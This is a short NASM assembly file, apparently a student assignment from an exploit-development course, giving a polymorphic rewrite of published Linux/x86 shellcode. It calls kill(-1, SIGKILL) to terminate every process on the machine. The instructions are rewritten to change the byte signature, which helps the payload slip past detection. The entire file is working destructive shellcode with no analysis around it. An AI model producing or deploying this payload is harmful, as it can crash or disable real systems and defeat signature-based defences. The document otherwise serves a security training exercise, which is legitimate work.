; Filename: shutallprocesses-polymorphic.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
; Purpose: Assignment 6 - Create polymorphic variant of existing shellcode
; http://shell-storm.org/shellcode/files/shellcode-212.php
; shellcode to kill all processes for Linux/x86


global _start

section .text
_start:

;	push byte 37
;	pop eax
	sub eax, eax
	mov al, 0x25	; = dec 37

;	push byte -1
;	pop ebx
	sub ebx, ebx
	dec ebx


;	push byte 9
;	pop ecx
	sub ecx, ecx
	mov cl, -0x9
	neg cl

	int 0x80
